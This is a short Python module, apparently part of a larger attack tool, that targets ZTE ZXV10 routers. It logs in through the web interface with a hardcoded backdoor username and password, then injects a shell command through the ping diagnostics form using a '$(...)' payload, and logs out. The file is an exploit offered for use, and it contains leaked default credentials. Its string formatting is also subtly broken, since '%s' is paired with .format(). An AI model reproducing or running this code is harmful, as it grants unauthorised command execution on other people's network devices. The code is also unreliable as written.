#! python !#
from misc.session import *

login_payload = "Frm_Logintoken=4&Username=root&Password=W%21n0%26oO7."

def ZteZxv10(ip, cmd, session):
    try:
        command_payload = "&Host=;$(%s)&NumofRepeat=1&DataBlockSize=64&DiagnosticsState=Requested&IF_ACTION=new&IF_IDLE=submit".format(cmd)
        url = "http://" + ip + ":8083/login.gch"
        url2 = "http://" + ip + ":8083/manager_dev_ping_t.gch"
        url3 = "http://" + ip + ":8083/getpage.gch?pid=1001&logout=1"
        session.post(url, timeout=3, data=login_payload) # bypass auth with backdoor
        session.post(url2, timeout=2.5, data=command_payload) # command injection in ping function
        session.get(url3, timeout=2.5) # logout so we dont keep the session open (it happens and its annoying)
    except Exception as e: return (False, e)